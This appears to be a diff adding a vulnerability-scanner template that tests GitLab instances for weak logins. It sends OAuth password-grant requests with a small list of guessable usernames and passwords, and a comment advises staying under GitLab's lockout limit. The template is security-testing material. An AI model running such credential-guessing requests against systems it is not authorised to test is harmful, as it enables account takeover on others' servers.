@@ -1,0 +1,55 @@
+id: gitlab-weak-login
+info:
+  name: Gitlab Weak Login
+  author: Suman_Kar
+  severity: high
+  tags: gitlab,default-login
+
+  # Gitlab blocks for 10 minutes after 5 "Invalid" attempts for valid user.
+  # So make sure, not to attempt more than 4 password for same valid user.
+
+requests:
+
+  - payloads:
+
+      gitlab_password:
+        - 12345
+        - 123456789
+      gitlab_user:
+        - 1234
+        - admin
+  # Enumerate valid user.
+
+    attack: clusterbomb
+
+    raw:
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: en-US,en;q=0.5
+        Referer: {{BaseURL}}
+        content-type: application/json
+        Connection: close
+
+        {"grant_type":"password","username":"§gitlab_user§","password":"§gitlab_password§"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - application/json
+
+      - type: word
+        part: body
+        words:
+          - '"access_token":'
+          - '"token_type":'
+          - '"refresh_token":'
+        condition: and
